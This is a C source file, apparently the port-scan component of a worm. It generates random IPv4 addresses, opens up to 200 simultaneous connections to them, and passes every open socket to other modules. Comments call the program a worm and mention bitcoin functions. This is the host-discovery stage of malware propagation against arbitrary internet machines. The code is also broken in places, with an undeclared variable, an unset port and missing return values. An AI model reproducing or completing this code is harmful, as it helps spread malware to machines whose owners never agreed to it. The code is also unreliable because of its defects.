/*
port scan module..
will allow other modules to use this to find machines, and then pass the socket to them
will allow multiple IP generation methods

if an IP is open for one port we will attempt all searches because itll be quicker if the host is awake for sure
*/
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netdb.h>
#include "../../list.h"
#include "../../structs.h"
#include "../../utils.h"
#include "portscan.h"

// lets set the maximum amount of scans to attempt simultaneously
#define MAX_PORTSCAN_SOCKETS 200
// timeout for each connect()
#define CONNECTION_TIMEOUT 15

Portscan *portscan_list = NULL;

// adds a port to the scanning list.. and the module to send the connection to afterwards
int Portscan_Add(Module *module, int port) {
    Portscan *pptr = NULL;
    
    if ((pptr = L_add((LIST **)&portscan_list, sizeof(Portscan))) == NULL)
        return -1;
        
    pptr->module = module;
    pptr->port = port;
}

// find a port scan by port..
Portscan *Portscan_FindByPort(int port) {
    Portscan *pptr = portscan_list;
    
    while (pptr != NULL) {
        if (pptr->port == port)
            break;
            
        pptr = pptr->next;
    }
    return pptr;
}

// enable a port scan
int Portscan_Enable(int port) {
    Portscan *pptr = Portscan_FindByPort(port);
    if (pptr) {
        pptr->enabled = 1;
        return 1;
    }
    return 0;
}

// disable a port scan
int Portscan_Disable(int port) {
    Portscan *pptr = Portscan_FindByPort(port);
    if (pptr) {
        pptr->enabled = 0;
        return 1;
    }
    return 0;
}


int Portscan_Init(Modules **);

// for port scanning.. we only care about nodes (starting new connections)
// and the main loop
ModuleFuncs portscan_funcs = {
    NULL, NULL,
    NULL, NULL,
    //&portscan_nodes,
    &portscan_main_loop,
    &portscan_connected,
    NULL, // no disconnect since we give away the connections..
    NULL,
    NULL
};

Modules HACK_portscan = {
    // required ( NULL, NULL, 0 )
    NULL, NULL, 0,
    // port, state
    0, 0,
    // required 0, 0..  
    0, 0,
    //timer = 300 seconds (5min) - get new nodes, etc
    // we will run this every 5 seconds since we are a WORM
    5,
    // bitcoin functions
    &portscan_funcs, NULL,
    // no magic bytes for portscan
    NULL, 0
};


// initialize the module
int Portscan_Init(Modules **_module_list) {
    Module_Add(_module_list, &HACK_portscan);
}


unsigned int IPGenerate() {
    unsigned int ret = 0;
    unsigned char *_raw = (unsigned char *)&ret;
    int a = 0;
    
    for (a = 0; a < 4; a++) {
        _raw[a] = rand()%255;
    }
    
    return ret;
}

int portscan_connected(Modules *mptr, Connection *cptr, char *buf, int size) {
    // we have to adopt it to its original module..
    Portscan *pptr = Portscan_FindByPort(cptr->port);
    if (pptr == NULL) {
        // wtf?
        ConnectionBad(cptr);
        return 0;
    }
    
    // adopt it to the module that will use the connection
    ConnectionAdopt(mptr, pptr->module, cptr);
    
    return 1;
}

int portscan_main_loop(Modules *mptr, Connection *conn, char *buf, int size) {
    int cur_ts = time(0);
    Connection *cptr = mptr->connections;
    int count = 0;
    int z = 0, a = 0, c = 0, port = 0, x= 0, b = 0, d = 0;
   int scan_count = 0;
    Portscan *pptr = NULL;
    // we have to check timeouts here.. just in case the OS timeouts arent working well..
    // all ports should be non blocking, and select() will determine if theres an error, or if it opens correctly
    // however the OS timeout may be too high..
    
    // we do this twice just so we don't lose any time..
    // since tcp_connect() may fail for various reasons
    // itll do the loop twice..
    for (d = 0; d < 2; d++) {
        // first we get a connection count..
        cptr = mptr->connections;
        while (cptr != NULL) {
            // do a 15 second timeout on any connection
            // once connected.. itll get adopted to its correct module
            if ((cur_ts - cptr->start_ts) > CONNECTION_TIMEOUT) {
                ConnectionBad(cptr);
            } else {
                count++;
            }
            
            cptr = cptr->next; 
        }
        
        // calculate how many more we need..
        a = MAX_PORTSCAN_SOCKETS - count;
        
        if (!a) break;
        
        // next we get the amount of portscans we are doing
        scan_count = L_count((LIST *)portscan_list);
        
        // just in case scan count is 0.. (we dont wanna crash)
        if (scan_count)
        // divide by how many scans we are doing.. so its equal
            a /= scan_count;
        
        // start at the top of the scan list.. and loop
        pptr = portscan_list;
        while (pptr != NULL) {
            // start 'a' new connections for this scan..
            for (b = 0; b < a; b++) {
                // now we have to generate more connections
                // x is a backup in case ther is a bug, or other OS level issues during tcp_connect()
                while (z < a && x++ < 500) {
                    // first we generate an IP address
                    unsigned int ip = IPGenerate();
                    
                    // connect to this new ip
                    c = tcp_connect(note, note->connections, ip, port, &cptr);

                    // if it worked.. we count it in z                    
                    if (c) {
                        z++;
                    }
                }
            }
            
            // go to next port scan..
            pptr = pptr->next;
        }
    }
    
    return 0;
}
